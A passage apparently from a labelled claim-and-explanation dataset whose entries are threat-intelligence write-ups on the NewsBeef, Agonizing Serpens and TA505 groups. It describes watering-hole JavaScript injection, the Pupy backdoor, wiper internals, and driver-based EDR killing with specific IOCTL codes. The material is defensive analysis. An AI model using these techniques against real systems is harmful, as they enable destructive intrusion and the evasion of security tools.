“maps.modon.gov[.]sa” was compromised in December 2016, and the “maps-modon[.]club” domain created on December 8, 2016. The domain shared the same IP address (45.76.32[.]252) as “ntg-sa[.]com”. Although we did not observe any malicious documents retrieved from that domain, it is likely that the domain served the same documents as ntg-sa[.]com. The filenames of the malicious Office documents (hosted at the spoofed NTG site) are relevant to typical IT and contracting resources and indicate that this scheme relies on effective social engineering tactics related to human resources and IT activities. In other schemes, the attackers sent macro-enabled Office attachments from spoofed law firm identities (or other relevant service providers) to targets in SA. The law firm in this scheme is based in the United Kingdom and is the sole location for targets outside of SA for this campaign. Below is a screenshot of a fake legal proposal in Word doc format, containing malicious macros and PowerShell code. The malicious document follows the same chain as the poisoned Flash player or Chrome Installer: Starting in October 2016, NewsBeef compromised a set of legitimate servers (shown below), and injected JavaScript to redirect visitors to hxxp://analytics-google[.]org:69/Check.aspx: The entire list of compromised servers is exclusively Saudi Arabian, and includes organizations from the following industries:These recent attacks against legitimate servers (when compared to previous NewsBeef activity) indicate that NewsBeef operators have improved their technical skills, specifically their ability to covertly inject JavaScript code into served web pages. Their injection and obfuscation techniques enable the actor to serve the same JavaScript with every page visit to the “watering hole” site as well as increase the difficulty of identifying the malicious JavaScript source on compromised sites. For example, on a Saudi government website, the NewsBeef APT delivered packed JavaScript into the bottom of a referenced script that is included in every page served from the site (the packed and unpacked JavaScript is shown below). The JavaScript forces visiting web browsers to collect and send (via a POST request) web browser, browser version, country of origin, and IP address data to the attacker controlled server “jquerycodedownload[.]live/check.aspx”. It is likely that this collection of visitor information represents an attempt to limit the number of infections to a specific target subset and reduce the attacker’s operational footprint. Although we did not identify injected JavaScript related to the “analytics-google[.]org/check.aspx” redirections, it is likely that it performed similar data collection and exfiltration (via POST). This technique appears to be an improvement over the simple .JPG beaconing which researchers observed in previous NewsBeef watering hole attacks. Packed JavaScript:The most trafficked of the compromised sites (which redirect to “jquerycode-download[.]live”) appears to be the government site at “scsb.gov[.]sa/portal/”. A high volume of redirections from the compromised site continues into mid-January 2017.Below is a list of compromised websites and the associated URL that serves the injected, second layer JavaScript. Note that the JavaScript resource changes on every compromised website among many other referenced JavaScript sources, making it difficult to track down the source of the malicious script per site:Pupy is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function backdoor. The backdoor is mainly written in Python and uses code from other open source attack tools like PowerSploit, Mimikatz, laZagne, etc. Pupy can generate backconnect or bindport payloads in multiple formats: PE executables (x86/x64) for Windows, ELF binary/.so for Linux, reflective DLLs (x86/x64), pure Python files, PowerShell, apk, and Rubber Ducky script (Windows). The malicious DLL deployed by NewsBeef contains Python code, a Python interpreter, and the MSVC runtime library as well as code that loads the Python interpreter, runs Python code and exports some functions for Python. A configuration string contains base64-encoded Python code (packed with zlib) with transport configuration and information about C2 server addresses. When initiated, the Python code attempts to retrieve and use SOCKS/HTTP proxy settings from the victim’s computer. The Python code then tries to initiate a reverse connection to the C2 server (139.59.46[.]154:3543) using a TCP protocol with RSA+AES traffic encryption and obfs3 transport using default keys from Pupy sources. After a successful connection, NewsBeef Pupy sends information about the infected computer and waits for commands (which take the form of modules) from the C2 server. The C2 server can send modules with Python code and compiled Python C extensions. The main functionality of the backdoor is implemented in packages (Python code, compiled Python C extensions, compiled executable files) and modules (Python code). Modules can directly access Python objects on the remote client using the RPyC module. The Python modules win32com, win32api, and ctypes are used to interact with the Win32 API. Attackers can use standard modules or write their own. All modules are executed in the memory (a Pupy process can migrate between processes using the corresponding module).Previous reports on the NewsBeef APT noted the group’s reliance on open-source tools to launch simple, yet effective attacks. Historically, the group has used BeEF to track targets and deliver malicious payloads. However, as this recent campaign indicates, the NewsBeef APT appears to have shifted its intrusion toolset away from BeEF and towards macro-enabled malicious Office documents, PowerSploit, and Pupy. Despite this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse of servers hosted by the service providers Choopa and Atlantic.net. The improvements in tactics, techniques and procedures appears to have paid off. The most recent campaign indicates that the group was able to compromise a larger number of sites including valuable, high-profile SA government identities. However, despite these improvements in technology, the NewsBeef APT continues to rely on social engineering schemes and open-source tools – attributes that increase the chances of identification. NewsBeef attacks against Saudi Arabian organizations and individuals (as well as targets in the European Union) are likely to continue. Additionally, researchers expect that as the group evolves, its tasking will expand to other organizations doing business with, or connected to Saudi Arabian organizations and individuals. Due to the group’s specific target set, it is crucial that SA security teams, administrators, and developers (especially web application administrators/developers) update their WordPress, Joomla, and Drupal-based web applications and plugins – as these assets are actively scanned and exploited by this APT.\n\n\n",

        "explain": "Unit 42 researchers have investigated a series of destructive cyberattacks beginning in January 2023 and continuing as recently as October 2023, targeting the education and technology sectors in Israel. The attacks are characterized by attempts to steal sensitive data, such as personally identifiable information (PII) and intellectual property. Once the attackers stole the information, they deployed various wipers intended to cover the attackers’ tracks and to render the infected endpoints unusable.Our investigation revealed the perpetrators of the attacks have strong connections to an Iranian-backed APT group Unit 42 tracks as Agonizing Serpens (aka Agrius, BlackShadow, Pink Sandstorm, DEV-0022). Unit 42 researchers were also able to identify novel new wipers and tools that Agonizing Serpens used in their most recent attacks:Based on forensic evidence, it appears that the Agonizing Serpens APT group has recently upgraded their capabilities and they are investing great efforts and resources to attempt to bypass endpoint detection and response (EDR) and other security measures. To do so, they have been rotating between using different known proof of concept (PoC) and pentesting tools as well as custom tools. For the attacks described below, the attacker was unsuccessful at bypassing Cortex XDR. Cortex XDR and XSIAM detect and prevent the execution flow described. They also build behavioral profiles of user activity over time with machine learning, allowing them to detect anomalous activity indicative of, for example, credential-based attacks. We are sharing this research to provide detection, prevention and hunting recommendations to help organizations protect against the threats associated with Agonizing Serpens.Agonizing Serpens (aka Agrius) is an Iranian-linked APT group that has been active since 2020. The group is known for its destructive wiper and fake-ransomware attacks and mainly targets Israeli organizations across multiple industries and countries. Though earlier reports of these attacks mentioned ransomware and ransom notes, these turned out to be a ruse (a trend noted in the 2023 Unit 42 Ransomware and Extortion Report). In the most recent attacks, the attackers did not request ransom – rather, the potential result of the attacks was vast data loss and disruptions of business continuity. Attacks from Agonizing Serpens usually have two main goals, the first being stealing sensitive information that includes PII and intellectual property, which threat actors then publish on social media or Telegram channels. It seems likely that their motivation to publish on social media is to sow fear or inflict reputational damage. The second goal is wreaking havoc and inflicting considerable damage by wiping as many endpoints as possible. Since its emergence, the group has developed new custom tools and they have also leveraged known hacking tools and techniques to carry out their aggressive operations.The following sections detail the different stages of a recent incident carried out by Agonizing Serpens in October 2023, as analyzed by Unit 42 researchers.The attackers gained initial access to the environment by exploiting vulnerable internet facing web servers. Subsequently, they deployed multiple web shells, which granted them a foothold in the network. The web shells that threat actors used in the described attack (shown in Figure 1) contain the same code as web shells that were observed in previous Agonizing Serpens attacks, with variations to the naming of functions. The web shells appear to be variations of ASPXSpy.Another web shell used in this attack was named Uploader.aspx. Figure 2 shows almost identical code found in two web shells used by Agonizing Serpens, one from a recent attack and the other from a past attack.Figure 3 shows how, shortly after the attackers deployed the web shells, they started to execute basic reconnaissance commands via the web shells.To map out the network, the attackers used various known and publicly available scanners.The attackers used Nbtscan, renamed as systems.txt, to scan the network for existing hosts (shown in Figure 4).Figure 5 shows how the attackers used an open-source SYN/TCP port scanner by WinEggDrop to scan particular hosts of interest.NimScan is another publicly available port scanner that the attackers used in the attack, as shown in Figure 6.A crucial phase of the attack consisted of obtaining credentials of users with administrative privileges. To do so, the attackers tried multiple methods to obtain credentials, which were prevented by the Cortex XDR platform:Figure 9 shows that to move laterally in the environment, the attackers mostly used Plink (renamed as systems.exe) to create remote tunneling and establish connections to remote machines.Attackers attempted to steal information from databases and other critical servers before executing wipers to cover their tracks. They then tried to exfiltrate this information to the attackers’ C2 servers, using different publicly available tools such as WinSCP and Putty.The data was saved into CSV files as shown in Figures 10 and 11. The tool writes the data to a hard-coded staging path: C:\\windows\\temp\\s\\. Figure 10 shows the attackers then used 7za.exe to archive the extracted data in preparation for exfiltration.Figure 12 shows the attackers also used 7zG.exe to archive interesting folders in the infected environment.The attackers attempted to use WinSCP to exfiltrate files from the environment, as shown in Figures 13 and 14.Figure 15 shows that another tool the attackers used for exfiltration is pscp.exe (PuTTY Secure Copy Protocol). The attackers attempted to establish a connection to the C2, then searched for .7z and .ezip files that contain stolen data, as well as .dmp files created by ProcDump.During the incident, the attackers attempted to use three separate wipers as part of the destructive attack. While some of the wipers show code similarities to previously reported wipers the Agonizing Serpens group used, others are considered brand new. These have been used for the first time in this attack, as detailed in the following section.The first wiper that the attackers used is .NET malware called MultiLayer. As its name suggests, this wiper contains multiple layers and stages. Its compilation date is Oct. 14, 2093. As this is set to a future date, it is a clear sign of metadata manipulation. Figure 16 shows that it contains two more binaries in its resources section, named MultiList and MultiWip. MultiLayer drops and executes each of the aforementioned binaries, then deletes them right after their execution.MultiList generates a list of all the files and their paths on the fixed drives on the system. It does this by enumerating all files on the infected operating system while excluding specific folders defined in a predefined list (shown in Figure 17). The attackers can define the path to which this tool should store the list via the command line.The MultiWip component contains the actual file wiping functionality. It relies on the previous component (MultiList) and reads the output list of files to wipe, which is passed as a command-line argument. MultiWip’s main function is called DoJob() and is responsible for carrying out the file-wiping activity in the manner shown in Figure 18.The malware takes the following steps in the order indicated:LastAccessTime, LastWriteTime and CreationTime. This is a well-known anti-forensic timestomping technique. The malware timestomps according to the file system. If the file system is NTFS, the malware sets the timestamp to 1601.1.1. Any other file system, the malware sets it to 1980.1.1 (shown in Figure 20).MultiLayer is designed to cover its tracks by erasing evidence of its execution. It does so by running various commands to prevent restoration of lost data and to render the disk unusable. Figure 21 shows that MultiLayer uses the DeleteLogs() function to create a scheduled task that launches a batch script only once. The script then removes all the Windows Event Logs.To remain stealthy, MultiLayer removes all the files it uses after its execution, including itself. To remove itself, MultiLayer uses SelfDelete(). The removal is implemented by threat actors writing a batch file named remover.bat to %TEMP% and executing it. The batch file deletes the assembly file and the batch itself, and then it clears the file system cache memory, leveraging the ProcessIdleTasks export in advapi32.dll. To further prevent data restoration, MultiLayer tries to remove all shadow copies on the system as shown in Figure 22, and then remove the Volume Shadow Copy (VSS) service itself. Finally, after the boot sector is corrupted, MultiLayer adjusts its privileges to SeShutdownPrivilege and calls the Windows API ExitWindowsEx with the EWX_REBOOT flag, which indicates system reboot. Once the system reboots, it will not be able to boot again. The attempt to execute MultiLayer was prevented by Cortex XDR, as depicted in Figure 24 below.Throughout our analysis of MultiLayer, we noticed multiple code overlaps with Apostle, IPsec Helper and Fantasy. These are custom tools previously used by Agonizing Serpens. This might be the result of a shared codebase or being written by the same team of developers. When comparing the code of the aforementioned tools, it appears that MultiLayer shares naming conventions and even entire code blocks with them. Example 1: Self-Deletion Mechanism The self-deletion mechanism of MultiLayer is implemented in a similar manner to IPsec Helper, Apostle and Fantasy. They share the same name for the function, named SelfDelete(). They also delete themselves by writing a batch file named remover.bat to %TEMP% and executing it, using the above mentioned functions shown in Figures 25 and 26.The recursive directory listing mechanism of MultiList is implemented in a similar manner to Fantasy and Apostle. They share the same name for the function, named GetSubDirectoryFileListRecusrive. They also both call GetSubDirectoryFileListRecusrive() and GetDirectoryFileList(), where GetSubDirectoryFileListRecusrive() is called recursively as shown in the code snippets in Figures 27 and 28.During the attack, the attackers attempted to use a second wiper, which they call PartialWasher or PW. Figure 29 shows that it was compiled on Oct. 8 and, unlike other .NET wipers mentioned in this article, it is written in C++.PartialWasher defines itself as a crucial process by calling NtSetInformationProcess, and it supports command-line arguments. In case no arguments are provided, the default functionality would be a wiper functionality. When passing 1 as an argument, the attacker can then use an interactive command-line interface (CLI). There are several typos in the interface’s text, indicating that the authors are likely not native English speakers. Figure 30 shows an example of the passed arguments S /p. They trigger the malware to gather information about available drives on the infected machine.The supported commands demonstrate the wiper’s further capabilities to perform individual wiping tasks at the request of its operators. These commands include:A third wiper that the attackers used is called BFG Agonizer (bfg.exe), according to its PDB path (E:\\tools2\\BFG agonizer\\INFECTOR\\Dropper\\Dropper\\Release\\Dropper.pdb). The file metadata indicates that it was compiled on Oct. 8, as shown in Figure 32.It is worth noting that there are many code similarities between BFG Agonizer and an open-source project called CRYLINE-v5.0, hosted on GitHub. We assess that BFG’s authors copied, or at the very least, relied heavily on this publicly available code. Before the wiper commences its wiping activity, it first attempts to circumvent security measures that might exist on the infected endpoint. It does so by implementing several anti-hooking techniques, which have not been reported thus far as part of the group's known techniques. This suggests a possible upgrade of their capabilities. The following sections list the anti-hooking functions BFG runs before its main payload.DLL unhooking is an anti-hooking technique that attempts to remove the user mode inline hooks, which various security solutions often implement. The technique works by restoring the bytes of the hooked functions to their original disk values. This technique is well known, and it is likely that the wipers’ authors largely adopted the following publicly available code.IAT unhooking is an anti-hooking technique that attempts to remove the user-mode IAT hooks, which various security solutions often implement. Based on the wiper’s code, it is likely that the authors largely adopted publicly available IAT unhooking code snippets.To wipe the boot sector, the wiper retrieves a device handle to \\.\\PhysicalDrive0 as shown in Figure 33. In turn, it calls DeviceIoControl with the IOCTL_DISK_GET_PARTITION_INFO control code to find the partition style.If the partition style is master boot record (MBR) or GUID partition table (GPT) it infects the first 6 sectors as shown in Figure 34.Finally, after the sectors are infected, the wiper adjusts its privileges to have the SeShutdownPrivilege and calls the native API NtRaiseHardError, which triggers a blue screen of death (BSOD) in the system with the error code of 0xC0000420. Once the system crashes, it will not be able to boot again (shown in Figure 35).The attempt to execute BFG Agonizer wiper was prevented by Cortex XDR, as depicted in Figure 36 below.During the attack, the group specifically attempted to bypass EDR solutions to carry out their attack uninterrupted and with greater stealth. These attempts were blocked by the Cortex XDR platform. It is interesting to note that the group tried multiple tools and techniques, and each time they failed with one, they tried to leverage another. While most of the techniques are known and well-documented, the group has not used them in previous publicly reported attacks. This could suggest that the group is becoming increasingly advanced and aggressive in its approach. The following sections list some of the EDR bypass tools and techniques in the order they leveraged them.The threat actor attempted their first EDR bypass technique on Oct. 6. The actor tried to manipulate the Cortex XDR service auto-start functionally. By leveraging previously obtained Administrator privileges, the attackers tried to modify the services Cortex XDR depends on, so it would not be able to auto-start upon system startup. Figure 37 shows these attempts were prevented, and then the attackers shifted into using custom tools that abuse the “bring your own vulnerable driver” (BYOVD) technique.The first custom tool the attackers used was a binary named agmt.exe, which was compiled on Oct. 7. According to its PDB path (C:\\Users\\dude\\source\\repos\\drvix\\x64\\Release\\drvix.pdb), it appears that this tool’s original name is drvIX (shown in Figure 38).However, according to the binary help function shown in Figure 39, the name is Drvtopia.Agmt.exe is a custom loader and operator for the GMER driver, gmer64.sys (renamed to AGMT.sys). GMER’s original intended purpose is to detect and remove rootkits; however, threat actors can also leverage it to remove security products. Using agmt.exe, the attackers can specify the PID of the target process they wish to terminate via the command line. Agmt.exe starts by registering GMER a new kernel driver (agmt.sys) as a service named AGMT and starting it, which in turn causes the operating system to load the driver into the kernel. To communicate and abuse the GMER functionality of terminating processes, agmt.exe retrieves a device handle to GMER’s device object as shown in Figure 40.Then, agmt.exe uses DeviceIoControl Windows API with the control code 0x9876C094, while specifying the PID in the Input_Buffer parameter of the call (shown in Figure 41).DeviceIoControl allows user mode processes to directly communicate with kernel drivers, allowing the processes to request the drivers to service certain operations for them. In the case of agmt.exe, the DeviceIoControl API call triggers a process termination operation for the GMER driver. Figure 44 shows that by inspecting the GMER driver, we can determine that the functionality of the 0x9876C094 control code is to terminate the target process provided by PID.The function opens a handle to the target process PID using ZwOpenProcess and then terminates it by calling ZwTerminateProcess. The attempt to leverage the GMER driver failed, as shown in Figure 43 below.As the attempt to exploit the GMER driver failed, the attackers tried arming their drvIX tool. They did so using a different vulnerable driver from a new publicly available PoC tool called BadRentdrv2, first published in the beginning of October 2023. The attacker used the same project and compiled a modified version of the tool a day later, on Oct. 8 as shown in Figure 44. This time, the binary’s original name drvIX.exe was not changed.The loading code of the driver looks almost identical to the aforementioned drvIX version. Similarly, drvIX.exe accepts the PID of the target process the attacker wishes to terminate via the command line. DrvIX retrieves a device handle to its device object and communicates with the Rentdrv2 driver via DeviceIoControl. DrvIX then sends the target PID by specifying it in a structure sent as the Input_Buffer and specifies the control code as 0x22E010 (shown in Figure 45).Similarly to the GMER driver, the 0x220E010 control code terminates the target process provided by its PID, as shown in Figure 46.The function opens a handle to the target process PID using ZwOpenProcess and terminates it by calling ZwTerminateProcess. Figure 47 shows this attempt was blocked and prevented by the Cortex XDR platform.In this article we provided a deep dive analysis of a recent destructive wiper attack carried out by the Iranian-linked Agonizing Serpens APT group. This attack is a part of a broader offensive campaign that targets Israeli organizations. Based on our telemetry, the most targeted organizations belong to the education and technology sectors. Our investigation uncovered new tools in the group’s arsenal that include a set of three previously undocumented wipers, as well as a database extractor tool. Analysis of the new wipers revealed that the group has upgraded their capabilities, putting an emphasis on stealth and evasive techniques designed to bypass security solutions such as EDR technology. As shown throughout our research, the Cortex XDR platform can detect and prevent the various stages of the attack lifecycle.\n\n\n",

They linked 24 “cyber-enabled operations” to the Iranian government last year, compared to seven the year before, and found a corresponding decline in the sorts of ransomware and wiper attacks typically deployed by Agrius. This week, however, cyber intelligence firm ClearSky reported that a suspected Iranian APT group had targeted eight Israeli websites connected to shipping and logistics in watering hole attacks — where specific users are targeted by infecting the sites they commonly visit.",

        "claim": "DEVELOPMENT OF THE ACTIVITY OF THE TA505 CYBERCRIMINAL GROUP",
        "original_label": "true",
        "label": "true",
        "explain": "It would seem that the TA505 intrusion set goes back to at least 2014 but was only mentioned publicly for the first time on Twitter in 2017. Until 2017, its activity seems to have been confined to the distribution of trojans and ransomwares [1]. In terms of final payload, TA505 has always widely used banking trojans that are not specific to it, such as Dridex and Trickbot:TA505 is supposed to have distributed the Dridex malware [2] as of July 2014, i.e. one month after its creation (June 2014) [1]. Its use of specific ID botnets1 within the Dridex network of botnets, controlled by the Evil Corp cybercriminal group, would suggest that TA505 was a Dridex affiliate from 2014 to 2017. ID botnets used by TA505 between 2014 and 2015 would have been botnet IDs 125, 220 and 223. The 220 botnet is thought to have contained 9650 bots in April 2015 [3], and mainly targeted banks [4], particularly in France. In 2016, TA505 is thought to have mainly concentrated on the use of Locky ransomware, to the detriment of Dridex malware, then resumed propagation of Dridex in 2017 through 7200 and 7500 ID botnets. TA505 finally stopped using Dridex in 2018 [5].TA505 is also thought to have been an affiliate of TrickBot2 , known under the pseudonym of mac1 [5]. The use of TrickBot by TA505 only lasted a few months in 2017. For example, a campaign dating back to June 2017 targeted France and the United Kingdom [5].2016 saw the appearance of Locky ransomware. Frequently used, it has targeted many victims. Like Dridex, Locky works on the principle of affiliates [1]. According to Proofpoint, affiliate number 3 of Locky and the affiliate of ID botnet Dridex 220, TA505, have points in common, such as similar lures on their phishing emails and very strong similarities regarding Javascript, VBScript codes and Microsoft Word macros used [7]. There is also an absence of Dridex 220 campaigns concomitant with the emergence of Locky [8]. Proofpoint [7] also pinpoints links between Locky and the affiliate of Dridex ID botnet 7200, TA505 at this time, comparing Dridex 2017 campaigns with Locky past campaigns [1]. TA505 is therefore presumed to be affiliate number 3 (”Affid=3”) of this ransomware. Although the main ransomware used by the group remains Locky, TA505 is thought to occasionally use other ran-somwares (Bart3 , Jaff4 , Scarab 5 , Philadelphia6 , GlobeImposter7 and GandCrab8 ). TA505 seems to have distributed its malware only through phishing email campaigns. This intrusion set was characterised by its massive use of Necurs botnet (see appendix in chapter 5) for the distribution of emails [9]. Comment: open source reports associate all ransomwares distributed by the Necurs botnet to TA505. However, some of these ransomwares were used over the same periods. It seems unlikely that TA505 operated as many encryption codes at the same time. It is more likely that Necurs had several clients simultaneously. This intrusion set relies exclusively over that period on social engineering to run its payload contained in malicious attachments linked to emails sent [9]. These attachments could be zip or 7zip archives containing VBS script or Javascript to be run by their victims, HTML pages containing malicious Javascript, or Offices documents bugged with malicious macros. Although TA505 does not seem to have used software vunerability to compromise its targets, it is interesting to observe that it has kept up to speed with the latest social engineering techniques. It therefore distributed bugged Office documents via the DDE mechanism less than a month after the potential abuse of this feature became common knowledge [10].The year 2018 was a turning point in the attack methods of the intrusion set. TA505 gradually reduced its distribution of malicious banking codes and ransomwares to move into the distribution of backdoors. However, this intrusion set does not seem to be content with running a payload on its victim’s computer. When it deems it useful, TA505 tries to compromise the entirety of the information system (IS) it penetrated. It also seems, in some cases, to resell accesses to the backdoors it has installed, which makes it difficult to distinguish between specific TA505 activities and those of potential clients. The chain of attack described in this chapter corresponds to the activities that ANSSI believes are linked to the intrusion set.The only infection vector currently known to be used by the TA505 intrusion set is phishing emails including a malicious attachment or link. Until 2018, the intrusion set relied practically exclusively on the Necurs botnet to distribute its payloads. However, following the unavailability of the botnet in January and February 2018, TA505 seems to have less often used its services [9]. This last point however is uncertain as there is little information on the alternative email distribution methods of the intrusion set. Given that TA505 has often deployed an email credentials theft implant among its victims [11][12], it is possible that it accumulates email addresses to distribute its new phishing campaigns. It has also been mentioned that some of its phishing emails had been distributed via machines infected by the Amadey [11] malware. Given that TA505 also uses Amadey malware as indicated in section 2.3.1, it may have created its own Amadey botnet to distribute its malicious emails, or may use the services of an existing Amadey botnet. This operating mode also usurps the recipient addresses of its emails, which makes it difficult to analyse its email distribution infrastructure [13].The intrusion set continues to rely on social engineering to run its malicious payloads on the machines of its email recipients, using several formats for attachments to work around its targets’ security systems: .url [14], .iqy [9], SettingContent-ms [15], MS publisher files [16], .wiz and .pub [17], .iso [18]. The aim of these documents was often to run msiexec9 commands via macros on the victim’s machine to upload and run a malware. However, in the second half of 2019 and first half of 2020, TA505 seems to have modified and stabilised its social engineering scheme. It now sends an HTML page as an attachment containing malicious Javascript code. This code redirects the victim towards an URL of a legitimate but compromised website. This same URL corresponds to an HTML page containing a minimal Javascript code redirecting the victim towards a page hosted by a machine controlled by the intrusion set. This page mimicks that of a legitimate file-sharing site adapted to the target such as Onedrive, Dropbox [19] or Naver10 (during one of its campaigns in South Korea) [20]. The victim is then encouraged to download, open and enable VBA macros of an Office document, usually Excel, containing a malicious payload .The intrusion set gradually increases the complexity of its social engineering method. In October 2019, it is thought to have directly sent links towards phishing pages in its malicious emails. It then used URL shorteners to mask these malicious links. In late February 2020, it abandoned the URL shortener strategy and started to use HTML attachments with Javascript with redirection from a compromised site, which made it even more difficult to detect its emails. Furthermore, some of its redirection pages integrate a link towards iplogger.org, a service allowing the intrusion set to inspect IP addresses visiting these pages[21]. Finally, it has already been observed that the phishing pages of the intrusion set distributed empty Office documents when a person other than the victim visited them. This behaviour can be explained by the fact that the intrusion set filters the IP addresses to which it chooses to distribute its malicious documents or only distributes them within limited time slots.TA505 has a varied attack arsenal to be deployed among its victims having run its malicious attachments. It consists of codes available both publicly and commercially on the black market or which seem to be exclusive to it. It therefore has malware development capabilites or financial resources to obtain them. The intrusion set deploys its arsenal in several stages and has different codes for each of them.The TA505 intrusion set seems to have tested several stage 1 codes11. It briefly used the following codes:The TA505 intrusion set therefore does not seem to hesitate to discard some of its malwares in order to test others. Despite that, a trend does emerge: it seems to more regularly use the stage 1 malware Get2, whose backdoor component is also called Friendspeak [13]. Since the first publication of this malware in September 2019 [19], the intrusion set regularly uses it. Get2 performs a basic reconnaissance of the machine it infects by sending to its C2 server information such as the name of the infected machine, the name of the user, the version of the Windows operating system and list of active processes on the machine. In return, if the machine is deemed to be of interest, it receives the URL to which it can upload the next stage malware.Once its stage 1 code has been deployed, the intrusion set can deploy several malwares.Once its malwares are installed, the intrusion set can try to lateralise itself within a compromised network. Its goal is to become the domain administrator. To achieve this, it uses several methods.The intrusion set scans the network to collect more information on the IS and discover vulnerable services [28]. One of the tools used by TA505 is the PowerSploit suite, a set of PowerShell scripts available in open-source and used to test the security of an IT network. The intrusion set particularly focuses on the Active Directory of the IS and has already deployed in the past another penetration test tool, PingCastle, to test configuration weaknesses affecting that service. Although crucial to take over the network, the intrusion set does not necessarily seem to perform these operations first. In several cases observed, the intrusion set firstly tends to try to compromise several other machines before scanning the IS and the Active Directory. The intrusion set seems to continue its network mapping work after having compromised the credentials of a domain administrator. It has already been observed that TA505 used a query software of Active Directory called AdFind on a domain controller to fully map an IS of which it had become the domain administrator.The method preferred by TA505 to increase its privileges and lateralise throughout a network seems to be the collection of credentials on compromised machines. The Mimikatz collection tool, available free of charge in opensource, is regularly used by the intrusion set and other tools of this type may also have been used. Unconfirmed hypotheses have also been made on the use of MS17-010 vulnerability 13 by the intrusion set [28].To facilitate its lateralisation operations and increase its robustness within a compromised network, the intrusion set has very frequently used Cobalt Strike, a penetration testing framework, and the TinyMet tool14. However, TA505 also often uses native Window tools such as WMIC and RDP to run its malware on new machines by using stolen credentials. The main goal of the intrusion set is to deploy ransomware. The use of ransomware by this intrusion set goes back to at least 2016 with its use of the Locky malware. Major developments since 2018 can be explained by the fact that TA505 now seeks to use ransomware to compromise entities liable to pay a high ransom (big game hunting) and to encrypt all the machines of the compromised IS. During TA505-related attacks, Clop ransomware, also called Ciop, was deployed. This malware was observed for the first time in February 2019 [20]. It has no automatic propagation functions. Consequently, the intrusion set uses some specific tools to deploy it within a whole IT system. Using a script, it deploys a malware, poorly documented in open-source but until now systematically called « sage.exe » by the intrusion set, on several machines [28]. These machines then connect to all the machines of the victim IS to successively run two payloads on each of them with a domain administrator account：It is probable that TA505 relies on the network mappings performed during the gradual compromission of the IS to choose the machines on which to run « sage.exe » and maximise the impact of its ransomware. An occurrence of use of the Rapid ransomware by TA505 was also observed by the South Korean Financial Security Institute (FSI) [20] in December 2019.A website was created in March 2020 to publish exfiltrated data of Clop ransomware victims not having paid their ransom, probably to increase pressure on future victims. A release was published by the attackers stating that should a hospital be accidentally victim of their ransomware, the data decrypter would be immediately provided. If, as sugested in section 2.5.3, Clop is specific to TA505, this illustrates the capability of this intrusion set to follow a trend initiated by other ransomware operators [29]. This trend is also interesting as it indicates that the intrusion set is required to exfiltrate data of its victim’s IS. If such data were to exceed a certain volume, it is then probable that TA505 needs to deploy specific tools and infrastructure for this task. Such things have not yet been observed for this intrusion set.ANSSI had mentioned a technical link between Clop ransomware and TA505. Indeed, Clop and FlawedAmmyy had been signed by the same valid but malicious security certificate [30]. To this, it is possible to add that these two malwares were compiled in similar environments and modified at the same time to change the letter « l » into « i » uppercase [20] in their chains. Furthermore, they have the same characteristic name « swaqp.exe » in separate attacks. It therefore seems probable that one single intrusion set handles both codes. Given that TA505 is the only one to have been seen to use them since 2018, it seems that both codes are specific to it.The intrusion set multiplies strategies to minimise the detection of its malware. Besides the use of attached document with unusual formats mentioned in section 2.2, TA505 has also used Excel 4.0 type macros. These very old macros were not often detected by security solutions during their adoption by the intrusion set. Likewise, TA505 relies heavily on native Windows tools, which require closer supervision of the IS to detect their malicious use.TA505 uses a compression code15 to make it more difficult to analyse its malware. This code, called Minedoor [13], was used to compress both early stage malwares such as FlawedGrace, and final codes deployed by TA505 such as Clop or DeactivateDefender [31]. Although this compression code is a valuable way to monitor TA505’s arsenal, caution is required. Attacks using codes protected by Minedoor with very different kill chains from that of TA505 have already been observed [13]. It therefore seems that this code is not specific to TA505.The intrusion set signs its malware by using legitimate but malicious security certificates. They often take over names of existing businesses. TA505’s codes are therefore more difficult to detect [20]. Like the Minedoor malware, it is not certain that all the malware signed by the certificates used by TA505 are linked to this intrusion set. Indeed it may be that TA505 used a third party to sign its codes and that this same third party may reuse those certificates to sign the malware of other intrusion sets .As mentioned in section 2.1, the infrastructure used by the intrusion set to distribute its emails is not widely documented. TA505 particularly seems to rent its infrastructure to conduct its operations, in particular to host its malicious Office documents and for its Get2 C2 servers16. The life cycle of this infrastructure is usually less than a month and the intrusion set permanently generates new domain names. These domain names often consist of several words separated by « - » and usually try to typosquat17 file-sharing services such as Onedrive ou Onehub for example. TA505 is thought to use a different strategy for the C2 servers of its penetration tools such as TinyMet or Cobalt Strike. It directly uses IP adresses as C2 servers and not domain names but still relies on a rented infrastucture.Little information is available about the infrastructure compromised by TA505. Web servers compromised by the intrusion set were analysed in February 2019 [20], indicating that several copies of the malicious web console Filesman had been found as well as a non-documented Linux backdoor.Although they only represent a fraction of the intrusion set’s real activity, the table below presents a set of campaigns conducted by TA505, documented in open-source since 2018. The financial sector used to be the exclusive target of the intrusion set before 2018 and has remained a regular target since. TA505 has however gradually expanded its victim profile to other new sectors.From a geographical point of view, all the continents are targeted by this intrusion set. A point of interest is the special attention TA505 seems to pay to South Korea. This interest could be linked to the fact that the intrusion set could have been working in connection with the Lazarus intrusion set as mentioned in chapter 3.Given its varied arsenal, the broadness of its targets, its sometimes massive, sometimes targeted campaigns, TA505 could well be a hacker-for-hire i.e. a provider of IS compromise and access qualification services. Its clients will provide it with a list of potential targets which TA505 will try to compromise, to then sell these compromised or qualified accesses to clients. At least two potential clients have been identified by editors: the Lazarus intrusion set known to be tied to North Korean interests in open-sources and the Silence [38] group.The simultaneous presence of Lazarus and TA505 has already been observed by different sources. In early January 2018, the Vietnamese CERT issued an alert relating to attacks targeting the financial sector, combining indicators of compromise attributed to intrusion sets linked to North Korean interests in open-sources to others attributed to TA505 [39]. According to Lexfo, IOCs found simultaneously on bank networks and Powershell scripts, attributed to TA505 and to Lazarus, seem similar [40]. Comment: As Dridex was used by Lazarus during the Bangladesh Bank heist in 2016, it is legitimate to query the prior opening of access by a cybercriminal group before the intrusion by Lazarus. [41]. In addition, the specific targeting of South Korea by TA505 could indicate an order from a final client such as an intrusion set known to be linked in open-sources to North Korean interests.There are code and infrastructure links between FlawedAmmyy and Truebot (aka Silence.Downloader), a remote administration tool specific to Silence18. According to the Group-IB editor, FlawedAmmyy.downloader and Truebot were developed by the same individual [42]. Furthermore, Silence is thought to have attacked at least one bank in Europe via TA505 in order to compromise its IS [43]. Comment: If Silence does indeed call on TA505 for the initial compromise, it would be to change the TTPs, as Silence, from its beginning, in 2016, is autonomous in the sending of phishing emails and initial compromise.According to the Korean Financial Security Institute (FSI) [20], there are similarities between TA505 and the FIN7 cybercriminal group, the successor to Carbanak and now specialising in the theft of credit card information. The two groups are thought to:Comment: 